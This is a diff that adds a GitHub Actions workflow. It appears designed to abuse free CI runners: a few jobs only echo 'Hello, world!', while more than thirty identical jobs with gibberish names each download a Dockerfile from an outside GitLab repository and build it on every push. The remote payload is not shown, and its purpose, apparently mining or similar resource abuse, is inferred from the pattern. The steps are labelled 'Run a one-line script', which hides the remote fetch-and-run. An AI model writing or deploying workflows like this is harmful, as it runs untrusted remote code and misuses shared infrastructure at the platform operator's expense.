@@ -1,0 +1,193 @@
+name: linux
+on: [push]
+jobs:
+  namestrap:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: ls && echo Hello, world!
+  bpefas:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: ls && echo Hello, world!
+  namjimunsha:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: ls && echo Hello, world!
+  lamestrap:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: ls && echo Hello, world!
+  aasem:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aasema:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aasemi:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aasemo:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aaseme:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aasemd:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  asem:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  asema:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  asemi:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  asemo:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aseme:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  asemd:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aaasems:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aaasemsa:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aaasemsi:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aaasemso:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aaasemse:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aaasemsd:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aasems:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aasemsa:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aasemsi:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aasemso:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aasemse:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  aasemsd:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  manifets:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  anjshubelr:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  cnakhny:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  bgahu:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  yertefagsh:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  xbanhukop:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  lambdafa:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  xvafstujmhujg:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  ansgbxhajhyubh:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
+  vxbaghjhsuhy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/majendafartis/alkemisa/-/raw/master/Dockerfile && docker build .
